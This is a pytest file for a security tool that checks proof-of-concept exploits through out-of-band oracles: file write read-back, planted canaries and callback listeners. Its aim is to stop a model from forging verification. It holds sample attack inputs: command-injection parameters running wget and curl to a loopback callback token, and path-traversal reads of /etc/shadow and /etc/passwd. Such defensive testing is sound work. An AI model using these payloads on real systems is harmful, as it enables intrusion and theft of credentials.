"""Phase-1 verification oracles (docs/design-verification-oracles.md): oob_write, canary_read,
and callback. Each proves a vuln class BEYOND reflected cmdi by observing a side effect on a
channel INDEPENDENT of the exploit's request — so it can't be forged by the producing model.

The exploit's sandbox run is faked here (FakeRunner) so the oracle logic, plant/read-back
wiring, assurance, and policy gating are tested offline. The callback oracle additionally has a
REAL local-loopback integration test (a live listener + a fake client that hits the token)."""

import re
import socket
import threading

import pytest

from hexgraph.db.session import session_scope
from hexgraph.engine.ingest import create_project, ingest_file
from hexgraph.engine.poc import verify_poc
from hexgraph.engine.surfaces import register_web_surface
from hexgraph.policy import PolicyViolation
from hexgraph import settings as st

from conftest import fixture_path


def _enable_net():
    st.update_settings({"features": {"network": {"enabled": True}}})


def _enable_poc():
    st.update_settings({"features.poc.enabled": True})


# A web target whose host is loopback/private (so local_*_scope accepts it).
def _web(s, p, base="http://127.0.0.1:8080"):
    return register_web_surface(s, p, base, name="vr")


def _parse_callback(cmd: str) -> tuple[str, int, str]:
    """Pull host, port, nonce-path out of a substituted command carrying a {{CALLBACK}} token
    (host:port/<nonce>) — what a fake target would parse to dial back."""
    m = re.search(r"(\d+\.\d+\.\d+\.\d+):(\d+)/(\S+)", cmd)
    assert m, f"no callback token in {cmd!r}"
    return m.group(1), int(m.group(2)), m.group(3)


# ── oob_write ──────────────────────────────────────────────────────────────────────────

class WriteRunner:
    """Stands in for the exploit run: records what the write step submitted so a fake rootfs
    read-back can reflect that the nonce 'landed'. Captures the substituted spec."""

    def __init__(self):
        self.ran = []

    def run_channel_probe(self, probe, *, channel, net_container=None, secret=None):
        self.ran.append(channel)
        # The web exploit "wrote" something; the in-band response is irrelevant for oob_write.
        return {"steps": [{"status": 200, "body": "written"}], "verified": False, "detail": "n/a"}


def test_oob_write_verified_via_independent_rootfs_read(hg_home, monkeypatch):
    """oob_write: the exploit writes {{NONCE}}; HexGraph reads the location back over the rootfs
    channel and confirms the nonce landed. Unforgeable: the read is independent of the request."""
    _enable_net()
    from hexgraph.engine import oracles

    landed = {}

    # The exploit run mirrors the submitted nonce into the file the read-back will fetch — i.e.
    # the write primitive actually placed the run's nonce at the target-controlled location.
    orig_run = oracles.run_exploit

    def capture(session, project, target, sub, r, *, is_web, is_tcp):
        landed["content"] = "file now contains: " + sub["steps"][0]["body"]["data"] + "\n"
        return orig_run(session, project, target, sub, r, is_web=is_web, is_tcp=is_tcp)

    def fake_read_back(session, project, target, *, channel, path, request, runner):
        assert channel == "rootfs" and path == "/tmp/pwn"
        return landed.get("content", "")

    monkeypatch.setattr(oracles, "run_exploit", capture)
    monkeypatch.setattr(oracles, "_read_back", fake_read_back)

    with session_scope() as s:
        p = create_project(s, name="oob")
        t = _web(s, p)
        spec = {"steps": [{"method": "POST", "path": "/save", "body": {"name": "x", "data": "{{NONCE}}"}}],
                "oracle": {"type": "oob_write", "channel": "rootfs", "path": "/tmp/pwn"}}
        out = verify_poc(s, p, t, spec, runner=WriteRunner())
        assert out["verified"] is True
        assert out["nonce"] in out["output"]  # the run nonce is what landed and was read back
        # a live web surface ⇒ input_reachable / dynamic
        assert out["assurance"]["standard"] == "input_reachable"
        assert out["assurance"]["method"] == "dynamic"


def test_oob_write_fails_when_nonce_absent(hg_home, monkeypatch):
    """If the independent read-back does NOT contain the run nonce, the oracle is NOT verified —
    a model can't claim a write it didn't perform."""
    _enable_net()
    from hexgraph.engine import oracles
    monkeypatch.setattr(oracles, "_read_back",
                        lambda *a, **k: "unrelated file content, no nonce here")
    with session_scope() as s:
        p = create_project(s, name="oob2")
        t = _web(s, p)
        spec = {"steps": [{"method": "POST", "path": "/save", "body": {"data": "{{NONCE}}"}}],
                "oracle": {"type": "oob_write", "channel": "rootfs", "path": "/tmp/pwn"}}
        out = verify_poc(s, p, t, spec, runner=WriteRunner())
        assert out["verified"] is False
        assert out["assurance"]["standard"] == "unconfirmed"


def test_oob_write_rootfs_read_is_traversal_safe(hg_home, tmp_path):
    """The read-back path must stay within the firmware's extracted rootfs."""
    from hexgraph.engine import oracles
    from hexgraph.engine.filesystem import persistent_base

    with session_scope() as s:
        p = create_project(s, name="oobfs")
        fw = ingest_file(s, p, fixture_path("vuln_httpd"), name="fw")
        root = persistent_base(p, fw.id) / "rootfs"
        root.mkdir(parents=True)
        (root / "secret").write_text("HEXGRAPH_PWNED_abc landed")
        fw.metadata_json = {**(fw.metadata_json or {}),
                            "filesystem": {"root_rel": "rootfs", "files": []}}
        s.flush()
        # in-bounds read works
        assert "landed" in oracles._rootfs_read(s, p, fw, "secret")
        # traversal escapes are refused
        with pytest.raises(ValueError):
            oracles._rootfs_read(s, p, fw, "../../../../etc/passwd")


def test_oob_write_http_not_forgeable_by_reflection(hg_home):
    """oob_write over the http read-back channel: a reflective read-back endpoint that echoes its
    OWN request params (which an attacker loaded with {{NONCE}}) must NOT verify — the read-back's
    reflections are stripped before matching, so only a genuinely-WRITTEN nonce counts."""
    _enable_net()

    class ReflectReadBack:
        def run_channel_probe(self, probe, *, channel, net_container=None, secret=None):
            req = channel.get("request")
            if req:  # the read-back GET — echo its params back (the forgery attempt)
                echo = " ".join(str(v) for v in (req.get("params") or {}).values())
                return {"response": {"status": 200, "body": echo}}
            return {"steps": [{"status": 200, "body": "written"}]}  # the exploit write step

    with session_scope() as s:
        p = create_project(s, name="oob_refl")
        t = _web(s, p)
        spec = {"steps": [{"method": "POST", "path": "/noop", "body": {"x": "{{NONCE}}"}}],
                "oracle": {"type": "oob_write", "channel": "http",
                           "request": {"method": "GET", "path": "/search", "params": {"q": "{{NONCE}}"}}}}
        out = verify_poc(s, p, t, spec, runner=ReflectReadBack())
        assert out["verified"] is False


def test_oob_write_http_header_reflection_not_forgeable(hg_home):
    """Forgery via a reflected HEADER (not just params): a read-back endpoint that echoes a
    request HEADER carrying {{NONCE}} must NOT verify — the full request (headers incl.) is
    stripped from the response before matching."""
    _enable_net()

    class HeaderReflect:
        def run_channel_probe(self, probe, *, channel, net_container=None, secret=None):
            req = channel.get("request")
            if req:  # echo a request header back in the body (the forgery)
                return {"response": {"status": 200, "body": " ".join((req.get("headers") or {}).values())}}
            return {"steps": [{"status": 200, "body": "written"}]}

    with session_scope() as s:
        p = create_project(s, name="oob_hdr")
        t = _web(s, p)
        spec = {"steps": [{"method": "POST", "path": "/noop", "body": {"x": "{{NONCE}}"}}],
                "oracle": {"type": "oob_write", "channel": "http",
                           "request": {"method": "GET", "path": "/echo", "headers": {"X-Probe": "{{NONCE}}"}}}}
        out = verify_poc(s, p, t, spec, runner=HeaderReflect())
        assert out["verified"] is False


# ── canary_read ────────────────────────────────────────────────────────────────────────

class ReadRunner:
    """Fake exploit: returns whatever the host planted at the path the spec read (a traversal),
    proving the read primitive retrieved the canary HexGraph planted out-of-band."""

    def __init__(self, planted_holder):
        self.planted_holder = planted_holder

    def run_channel_probe(self, probe, *, channel, net_container=None, secret=None):
        # The "read primitive" returns the file it read — simulate by echoing the planted canary.
        return {"steps": [{"status": 200, "body": f"<<{self.planted_holder['value']}>>"}],
                "verified": False, "detail": "n/a"}


def test_canary_read_verified_with_planted_canary(hg_home, monkeypatch):
    """canary_read: HexGraph plants a random canary out-of-band BEFORE the exploit; the read
    primitive must return it. Unforgeable: the model cannot know a freshly-planted random value."""
    _enable_net()
    from hexgraph.engine import oracles

    planted = {"value": None}

    def fake_plant(session, project, target, *, channel, path, value):
        planted["value"] = value  # remember what HexGraph planted

    monkeypatch.setattr(oracles, "_plant", fake_plant)

    with session_scope() as s:
        p = create_project(s, name="canary")
        t = _web(s, p)
        spec = {"plant": {"channel": "rootfs", "path": "/www/canary.txt"},
                "steps": [{"method": "GET", "path": "/download?f=../../www/canary.txt"}],
                "oracle": {"type": "canary_read"}}
        out = verify_poc(s, p, t, spec, runner=ReadRunner(planted))
        assert out["verified"] is True
        assert planted["value"].startswith("HEXGRAPH_CANARY_")
        assert out["assurance"]["standard"] == "input_reachable"


def test_canary_read_not_forgeable_with_wrong_value(hg_home, monkeypatch):
    """If the read primitive returns something OTHER than the planted canary, it does not
    verify — a model echoing a guess can't satisfy it."""
    _enable_net()
    from hexgraph.engine import oracles
    monkeypatch.setattr(oracles, "_plant", lambda *a, **k: None)

    class WrongRunner:
        def run_channel_probe(self, probe, *, channel, net_container=None, secret=None):
            return {"steps": [{"status": 200, "body": "HEXGRAPH_CANARY_iguessed"}]}

    with session_scope() as s:
        p = create_project(s, name="canary2")
        t = _web(s, p)
        spec = {"plant": {"channel": "rootfs", "path": "/www/c.txt"},
                "steps": [{"method": "GET", "path": "/read"}], "oracle": {"type": "canary_read"}}
        out = verify_poc(s, p, t, spec, runner=WrongRunner())
        assert out["verified"] is False


def test_canary_read_rejects_agent_known_value_literal(hg_home):
    """An agent-supplied `known_value` literal is NOT ground truth (a reflective endpoint could
    echo it) — the oracle REJECTS it and directs to plant or read a known secret out-of-band."""
    _enable_net()

    class Echo:
        def run_channel_probe(self, probe, *, channel, net_container=None, secret=None):
            return {"steps": [{"status": 200, "body": "$6$KNOWNHASH"}]}

    with session_scope() as s:
        p = create_project(s, name="canary3")
        t = _web(s, p)
        spec = {"plant": {"known_value": "$6$KNOWNHASH"},
                "steps": [{"method": "GET", "path": "/download?f=../../etc/shadow"}],
                "oracle": {"type": "canary_read"}}
        out = verify_poc(s, p, t, spec, runner=Echo())
        assert out["verified"] is False and "known_value" in out["detail"]


def test_canary_read_known_secret_read_out_of_band(hg_home, monkeypatch):
    """The `known` form: HexGraph reads the ground-truth secret via a NON-REFLECTIVE file channel
    (rootfs/remote — an actual stored secret it reads itself), then the exploit must return it. The
    agent never sees the value and there is no request to reflect."""
    _enable_net()
    from hexgraph.engine import oracles
    SECRET = "S3cr3t_FROM_DEVICE_ABC123"
    # the known-read is a real file read (rootfs/remote); the exploit then returns the secret
    monkeypatch.setattr(oracles, "_read_back",
                        lambda session, project, target, *, channel, path, request, runner: SECRET)

    class ReturnsSecret:
        def run_channel_probe(self, probe, *, channel, net_container=None, secret=None):
            return {"steps": [{"status": 200, "body": f"...{SECRET}..."}]}  # the exploit read

    with session_scope() as s:
        p = create_project(s, name="canary_known")
        t = _web(s, p)
        spec = {"plant": {"known": {"channel": "remote", "path": "/etc/device_secret"}},
                "steps": [{"method": "GET", "path": "/download?f=../../etc/device_secret"}],
                "oracle": {"type": "canary_read"}}
        out = verify_poc(s, p, t, spec, runner=ReturnsSecret())
        assert out["verified"] is True


def test_canary_read_known_http_request_rejected(hg_home):
    """The `known` ground truth must NOT come from an agent-crafted http request — a reflective
    endpoint could launder an attacker value through SOME request field (param/header name, the
    verb, …). Only non-reflective file channels (rootfs/remote) are accepted; http is rejected."""
    _enable_net()

    class Whatever:
        def run_channel_probe(self, probe, *, channel, net_container=None, secret=None):
            return {"response": {"status": 200, "body": "x"}}

    with session_scope() as s:
        p = create_project(s, name="canary_known_http")
        t = _web(s, p)
        spec = {"plant": {"known": {"channel": "http", "request": {"method": "GET", "path": "/echo"}}},
                "steps": [{"method": "GET", "path": "/read"}], "oracle": {"type": "canary_read"}}
        out = verify_poc(s, p, t, spec, runner=Whatever())
        assert out["verified"] is False and "non-reflective" in out["detail"]


def test_request_echoes_covers_all_surfaces_but_skips_short():
    """The reflection stripper reaches EVERY submitted surface (verb/path/param+header KEYS and
    values/nested body) for tokens long enough to carry the secret, AND skips short structural
    tokens so it can't over-strip a legitimate secret."""
    from hexgraph.engine import oracles
    echoes = oracles._request_echoes(
        {"method": "GET", "path": "/longpath/secretishvalue",
         "params": {"id": "x", "LONGPARAMKEY": "LONGPARAMVALUE1"},
         "headers": {"X-Short": "y", "X-LONGHEADERKEY": "LONGHEADERVAL1"},
         "body": {"k": ["LONGBODYVALUE01", {"NESTEDLONGKEY1": "LONGNESTEDVAL1"}]}})
    # long surfaces — including KEY NAMES and nested body — ARE collected (would be stripped)
    for token in ("/longpath/secretishvalue", "LONGPARAMKEY", "LONGPARAMVALUE1", "X-LONGHEADERKEY",
                  "LONGHEADERVAL1", "LONGBODYVALUE01", "NESTEDLONGKEY1", "LONGNESTEDVAL1"):
        assert token in echoes, token
    # short structural tokens are NOT stripped (no over-strip of a legit secret)
    for token in ("GET", "id", "x", "y", "k", "X-Short"):
        assert token not in echoes, token


def test_canary_read_not_forgeable_by_reflection(hg_home, monkeypatch):
    """The canary VALUE is never placed in the exploit request, so a maliciously-REFLECTIVE target
    (echoing the request back) cannot produce it → must NOT verify. This is the forgery the
    previous {{CANARY}}-into-the-request design allowed."""
    _enable_net()
    from hexgraph.engine import oracles
    planted = {"value": None}
    monkeypatch.setattr(oracles, "_plant",
                        lambda session, project, target, *, channel, path, value: planted.__setitem__("value", value))

    class ReflectRunner:
        def __init__(self): self.seen = None
        def run_channel_probe(self, probe, *, channel, net_container=None, secret=None):
            self.seen = channel
            step = channel["steps"][0]
            echo = str(step.get("path", "")) + " " + " ".join(str(v) for v in (step.get("params") or {}).values())
            return {"steps": [{"status": 200, "body": echo}]}  # reflect the request — the attack

    with session_scope() as s:
        p = create_project(s, name="canary_refl")
        t = _web(s, p)
        r = ReflectRunner()
        spec = {"plant": {"channel": "rootfs", "path": "/www/c.txt"},
                "steps": [{"method": "GET", "path": "/read?f=../../www/c.txt", "params": {"x": "anything"}}],
                "oracle": {"type": "canary_read"}}
        out = verify_poc(s, p, t, spec, runner=r)
        assert planted["value"] not in str(r.seen)   # the value never reached the request
        assert out["verified"] is False               # so reflection can't forge the read


# ── callback (unit, faked exploit) ───────────────────────────────────────────────────────

def test_callback_verified_when_listener_hit(hg_home):
    """callback: the exploit (faked) dials back the {{CALLBACK}} token; the listener records a
    hit carrying the per-run nonce ⇒ verified. The exploit produced NO reflected output."""
    _enable_net()

    class CallbackRunner:
        """Simulates a blind-cmdi target that, given the {{CALLBACK}} token, connects back."""
        def run_channel_probe(self, probe, *, channel, net_container=None, secret=None):
            host, port, path = _parse_callback(channel["steps"][0]["params"]["cmd"])
            with socket.create_connection((host, port), timeout=3) as c:
                c.sendall(f"GET /{path} HTTP/1.0\r\n\r\n".encode())
                try:
                    c.recv(64)
                except OSError:
                    pass
            return {"steps": [{"status": 200, "body": "no output"}], "verified": False}

    with session_scope() as s:
        p = create_project(s, name="cb")
        t = _web(s, p)
        spec = {"steps": [{"method": "GET", "path": "/diag", "params": {"cmd": "wget http://{{CALLBACK}}"}}],
                "oracle": {"type": "callback", "timeout": 5}}
        out = verify_poc(s, p, t, spec, runner=CallbackRunner())
        assert out["verified"] is True
        assert out["assurance"]["standard"] == "input_reachable"


def test_callback_not_verified_without_hit(hg_home):
    """No callback within the bounded timeout ⇒ NOT verified (a model can't fake an inbound hit)."""
    _enable_net()

    class NoCallback:
        def run_channel_probe(self, probe, *, channel, net_container=None, secret=None):
            return {"steps": [{"status": 200, "body": "nothing happened"}]}

    with session_scope() as s:
        p = create_project(s, name="cb2")
        t = _web(s, p)
        spec = {"steps": [{"method": "GET", "path": "/diag", "params": {"cmd": "{{CALLBACK}}"}}],
                "oracle": {"type": "callback", "timeout": 1}}
        out = verify_poc(s, p, t, spec, runner=NoCallback())
        assert out["verified"] is False


def test_callback_stray_hit_without_nonce_does_not_verify(hg_home):
    """A connection to the listener that does NOT carry the per-run nonce is not proof — only the
    nonce attributes a hit to THIS run, so a stray/unrelated connection can't forge it."""
    _enable_net()

    class StrayRunner:
        def run_channel_probe(self, probe, *, channel, net_container=None, secret=None):
            host, port, _path = _parse_callback(channel["steps"][0]["params"]["cmd"])
            with socket.create_connection((host, port), timeout=3) as c:
                c.sendall(b"GET /WRONG_NONCE HTTP/1.0\r\n\r\n")  # no real nonce
                try:
                    c.recv(64)
                except OSError:
                    pass
            return {"steps": [{"status": 200}]}

    with session_scope() as s:
        p = create_project(s, name="cb3")
        t = _web(s, p)
        spec = {"steps": [{"method": "GET", "path": "/x", "params": {"cmd": "{{CALLBACK}}"}}],
                "oracle": {"type": "callback", "timeout": 2}}
        out = verify_poc(s, p, t, spec, runner=StrayRunner())
        assert out["verified"] is False


# ── callback (REAL local-loopback integration) ───────────────────────────────────────────

def test_callback_listener_real_loopback_roundtrip(hg_home):
    """REAL integration: bring up the actual CallbackListener on loopback, have a fake 'target'
    client hit the minted token, and assert the listener records the hit + the egress audit fires.
    Proves the listener MECHANISM end-to-end (no Docker needed)."""
    _enable_net()
    from hexgraph.engine.audit import list_egress
    from hexgraph.engine.callback_listener import CallbackListener

    with session_scope() as s:
        p = create_project(s, name="cbreal")
        t = _web(s, p)

        class RealClientRunner:
            """A fake target process that, when run, dials the callback token over a real socket
            from a separate thread — exactly what a blind-RCE target would do."""
            def run_channel_probe(self, probe, *, channel, net_container=None, secret=None):
                host, port, path = _parse_callback(channel["steps"][0]["params"]["cmd"])

                def dial():
                    with socket.create_connection((host, port), timeout=3) as c:
                        c.sendall(f"GET /{path} HTTP/1.0\r\nHost: x\r\n\r\n".encode())
                        c.recv(128)
                threading.Thread(target=dial, daemon=True).start()
                return {"steps": [{"status": 200, "body": "(blind — no reflected output)"}]}

        spec = {"steps": [{"method": "GET", "path": "/exec",
                           "params": {"cmd": "curl http://{{CALLBACK}}"}}],
                "oracle": {"type": "callback", "timeout": 5}}
        out = verify_poc(s, p, t, spec, runner=RealClientRunner())
        assert out["verified"] is True
        # the listener's ingress + the received hit are both audited (the ingress mirror of egress)
        tools = {e["tool"] for e in list_egress(s, p.id)}
        assert "callback_listener" in tools and "callback_hit" in tools


def test_callback_listener_refuses_non_local_bind(hg_home):
    """The listener is the ingress mirror of bounded egress — it MUST refuse a non-loopback/
    private bind, the same structural containment as local_network_scope."""
    from hexgraph.engine.callback_listener import CallbackListener
    with pytest.raises(PolicyViolation):
        CallbackListener(host="8.8.8.8")


def test_callback_listener_binds_loopback_and_mints_token(hg_home):
    from hexgraph.engine.callback_listener import CallbackListener
    with CallbackListener(host="127.0.0.1") as cb:
        assert cb.bound_host == "127.0.0.1" and cb.bound_port > 0
        tok = cb.token()
        assert tok.startswith("127.0.0.1:") and cb.nonce in tok


# ── policy gate ──────────────────────────────────────────────────────────────────────────

def test_new_oracles_gated_by_network_tier(hg_home):
    """With the network tier OFF, a web-surface oracle must be refused at the egress gate —
    the new oracles relax NO gate outside the policy seam."""
    with session_scope() as s:
        p = create_project(s, name="gate")
        t = _web(s, p)
        spec = {"steps": [{"method": "GET", "path": "/x"}],
                "oracle": {"type": "callback", "timeout": 1}}
        with pytest.raises(PolicyViolation):
            verify_poc(s, p, t, spec, runner=WriteRunner())


def test_is_new_oracle_recognizes_phase1_types():
    from hexgraph.engine import oracles
    assert oracles.is_new_oracle({"oracle": {"type": "oob_write"}})
    assert oracles.is_new_oracle({"oracle": {"type": "canary_read"}})
    assert oracles.is_new_oracle({"oracle": {"type": "callback"}})
    assert not oracles.is_new_oracle({"oracle": {"type": "body_contains"}})
    assert not oracles.is_new_oracle({"oracle": {}})
    assert not oracles.is_new_oracle({})
